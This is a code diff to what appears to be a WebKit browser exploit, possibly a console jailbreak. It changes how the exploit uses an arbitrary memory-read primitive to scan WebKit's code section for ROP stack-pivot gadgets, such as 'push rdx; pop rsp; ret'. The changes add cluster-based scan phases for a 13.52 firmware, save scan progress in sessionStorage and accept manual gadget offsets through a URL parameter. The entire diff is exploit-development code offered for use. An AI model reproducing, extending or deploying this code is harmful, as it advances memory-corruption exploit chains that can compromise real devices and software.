@@ -16,13 +16,14 @@ import {
 } from "./pivot_gadgets.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250828h";
+const BUILD_ID = "rw-20250828i";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
 /** Scan low .text first — MOV @ +0x1f9bb; 13.00 hints @ +0x295f… are wrong on 13.52 */
-const SCAN_LOW_MAX = parseInt(params.get("scanlowmax") || "800000", 16);
+const SCAN_LOW_MAX = parseInt(params.get("scanlowmax") || "1000000", 16);
+const SCAN_CLUSTER_PAD = parseInt(params.get("scanclusterpad") || "40000", 16);
 const SCAN_PIVOT_MAX = parseInt(params.get("scanmax") || "4800000", 16);
 const SCAN_NEAR_RADIUS = parseInt(params.get("scanrad") || "8000", 16);
 /** cal-style fast scan: read8 + 8-byte step, yield every 256 reads (like scanGadgetChunk) */
@@ -616,17 +617,53 @@ function loadEffectiveOff() {
     return off;
 }
 
-function pivotScanRange(key, phase) {
+function pivotClusterRange(found) {
+    const known = [];
+    for (let i = 0; i < PIVOT_ROWS.length; i++) {
+        const k = PIVOT_ROWS[i][1];
+        const r = (found && found[k] != null) ? found[k] : PIVOT_HW_1352[k];
+        if (r != null) known.push(r);
+    }
+    if (!known.length) return null;
+    let lo = known[0];
+    let hi = known[0];
+    for (let i = 1; i < known.length; i++) {
+        if (known[i] < lo) lo = known[i];
+        if (known[i] > hi) hi = known[i];
+    }
+    return {
+        minRva: Math.max(SCAN_PIVOT_MIN, lo - SCAN_CLUSTER_PAD),
+        maxRva: Math.min(SCAN_LOW_MAX, hi + SCAN_CLUSTER_PAD),
+    };
+}
+
+function pivotScanRange(key, phase, found) {
+    if (phase === "cluster") {
+        return pivotClusterRange(found);
+    }
     if (phase === "low") {
         return { minRva: SCAN_PIVOT_MIN, maxRva: SCAN_LOW_MAX };
     }
     const hint = pivotHint(key);
-    /** 13.00 hints above low .text (e.g. G5 @ +0x2abccaa) OOM on 13.52 — never scan them */
     if (hint <= 0 || hint >= SCAN_LOW_MAX) return null;
     return {
         minRva: Math.max(SCAN_PIVOT_MIN, hint - SCAN_NEAR_RADIUS),
         maxRva: Math.min(SCAN_LOW_MAX, hint + SCAN_NEAR_RADIUS),
     };
+}
+
+function pivotScanPatterns(label, pat) {
+    if (label === "G5") {
+        return [
+            [0x52, 0x5c, 0xc3],
+            [0x41, 0x52, 0x5c, 0xc3],
+        ];
+    }
+    return [pat];
+}
+
+function pivotStartPhase(label) {
+    return label === "G5" ? "cluster" : "low";
 }
 
 function pivotScanFoundInit() {
@@ -668,11 +705,21 @@ function matchPatAt(bytes, startOff, pat) {
     return true;
 }
 
-function findPatInRead8(bytes, pat) {
-    for (let start = 0; start < 8; start++) {
+function findPatInWindow(bytes, pat) {
+    const maxStart = bytes.length - pat.length;
+    for (let start = 0; start <= maxStart; start++) {
         if (matchPatAt(bytes, start, pat)) return start;
     }
     return -1;
+}
+
+function readWindow16(p, base, rva) {
+    const w0 = read8p(p, base.add32(rva));
+    if (!w0) return null;
+    const b0 = bytesFromRead8(w0);
+    const w1 = read8p(p, base.add32(rva + 8));
+    if (!w1) return b0;
+    return b0.concat(bytesFromRead8(w1));
 }
 
 function scanState(msg) {
@@ -692,7 +739,8 @@ function advancePivotRowIdx(pivotScan) {
         if (!pivotRowDone(pivotScan.found, key)) return false;
         pivotScan.rowIdx++;
         pivotScan.cursor = null;
-        pivotScan.phase = "low";
+        pivotScan.phase = pivotStartPhase(PIVOT_ROWS[pivotScan.rowIdx]
+            ? PIVOT_ROWS[pivotScan.rowIdx][0] : "G0");
     }
     return true;
 }
@@ -721,11 +769,13 @@ function preparePivotScan(webkitBase) {
         if (i === PIVOT_ROWS.length - 1) rowIdx = PIVOT_ROWS.length;
     }
     const prev = loadPivotScanState(webkitBase);
+    const rowLabel = rowIdx < PIVOT_ROWS.length ? PIVOT_ROWS[rowIdx][0] : "";
+    const startPhase = pivotStartPhase(rowLabel);
     pivotScan = {
         base: String(webkitBase),
         rowIdx,
-        cursor: (prev && prev.rowIdx === rowIdx) ? prev.cursor : null,
-        phase: (prev && prev.rowIdx === rowIdx) ? (prev.phase || "low") : "low",
+        cursor: (prev && prev.rowIdx === rowIdx && prev.phase === startPhase) ? prev.cursor : null,
+        phase: (prev && prev.rowIdx === rowIdx) ? (prev.phase || startPhase) : startPhase,
         found,
     };
     if (rowIdx < PIVOT_ROWS.length) {
@@ -755,10 +805,18 @@ async function scanPivotRowPhase(p, webkitBase, off) {
     const key = row[1];
     const label = row[0];
     const pat = pivotPattern(row, off);
-    if (!pivotScan.phase) pivotScan.phase = "low";
-    const range = pivotScanRange(key, pivotScan.phase);
+    const pats = pivotScanPatterns(label, pat);
+    if (!pivotScan.phase) pivotScan.phase = pivotStartPhase(label);
+    const range = pivotScanRange(key, pivotScan.phase, pivotScan.found);
     if (!range) {
-        mark("SCAN-MISS", label + " — no low hint (skipped 13.00 high RVA)");
+        if (pivotScan.phase === "cluster") {
+            pivotScan.phase = "low";
+            pivotScan.cursor = null;
+            savePivotScanState(pivotScan);
+            mark("SCAN-PHASE", label + " — cluster skip, full low .text");
+            return "continue";
+        }
+        mark("SCAN-MISS", label + " — no scan range");
         pivotScan.rowIdx++;
         pivotScan.cursor = null;
         pivotScan.phase = "low";
@@ -771,10 +829,11 @@ async function scanPivotRowPhase(p, webkitBase, off) {
     const hint = pivotScanHint(key, pivotScan.found, SCAN_LOW_MAX);
 
     while (rva < range.maxRva && !scanPivotStop) {
-        const w = read8p(p, webkitBase.add32(rva));
-        if (w) {
-            const offIn = findPatInRead8(bytesFromRead8(w), pat);
-            if (offIn >= 0) {
+        const win = readWindow16(p, webkitBase, rva);
+        if (win) {
+            for (let pi = 0; pi < pats.length; pi++) {
+                const offIn = findPatInWindow(win, pats[pi]);
+                if (offIn < 0) continue;
                 const cand = rva + offIn;
                 if (hit == null)
                     hit = cand;
@@ -789,7 +848,7 @@ async function scanPivotRowPhase(p, webkitBase, off) {
             if (SCAN_SAVE_EVERY > 0 && (steps & (SCAN_SAVE_EVERY - 1)) === 0)
                 savePivotScanState(pivotScan);
             if (SCAN_STATE_EVERY > 0 && (steps & (SCAN_STATE_EVERY - 1)) === 0)
-                scanState("scan " + label + " @+0x" + rva.toString(16));
+                scanState("scan " + label + " " + pivotScan.phase + " @+0x" + rva.toString(16));
             await new Promise(r => setTimeout(r, 0));
         }
     }
@@ -808,9 +867,18 @@ async function scanPivotRowPhase(p, webkitBase, off) {
             + " (" + steps + " reads)");
         pivotScan.rowIdx++;
         pivotScan.cursor = null;
-        pivotScan.phase = "low";
+        pivotScan.phase = pivotStartPhase(PIVOT_ROWS[pivotScan.rowIdx]
+            ? PIVOT_ROWS[pivotScan.rowIdx][0] : "G0");
         savePivotScanState(pivotScan);
         updatePivotReady(p, loadEffectiveOff());
+        return "continue";
+    }
+
+    if (pivotScan.phase === "cluster") {
+        pivotScan.phase = "low";
+        pivotScan.cursor = null;
+        savePivotScanState(pivotScan);
+        mark("SCAN-PHASE", label + " cluster miss (" + steps + ") — full low .text");
         return "continue";
     }
 
@@ -818,16 +886,16 @@ async function scanPivotRowPhase(p, webkitBase, off) {
         pivotScan.phase = "hint";
         pivotScan.cursor = null;
         savePivotScanState(pivotScan);
-        const hintRange = pivotScanRange(key, "hint");
+        const hintRange = pivotScanRange(key, "hint", pivotScan.found);
         if (!hintRange) {
-            mark("SCAN-MISS", label + " not in low .text — paste RVA if found on HW");
+            mark("SCAN-MISS", label + " — tap G5 button or ?g5=hex on URL");
             pivotScan.rowIdx++;
             pivotScan.cursor = null;
             pivotScan.phase = "low";
             savePivotScanState(pivotScan);
             return "continue";
         }
-        mark("SCAN-PHASE", label + " low miss (" + steps + " reads) — hint pass");
+        mark("SCAN-PHASE", label + " low miss (" + steps + ") — hint pass");
         return "continue";
     }
 
@@ -1348,6 +1416,17 @@ function init() {
             sessionStorage.removeItem("wk-scanned-pivot");
             sessionStorage.removeItem("wk-scanned-pivot-base");
         } catch (_) { }
+    }
+
+    const g5raw = params.get("g5");
+    if (g5raw) {
+        const g5rva = parseInt(String(g5raw).replace(/^0x/i, ""), 16);
+        if (g5rva > 0) {
+            const found = loadScannedPivot() || Object.assign({}, PIVOT_HW_1352);
+            found.wk_PUSH_RDX_POP_RSP_RET = g5rva;
+            try { sessionStorage.setItem("wk-scanned-pivot", JSON.stringify(found)); } catch (_) { }
+            mark("G5-MANUAL", "+0x" + g5rva.toString(16) + " from ?g5= URL");
+        }
     }
 
     if (params.get("clearlog") === "1") clearPersistedLog();
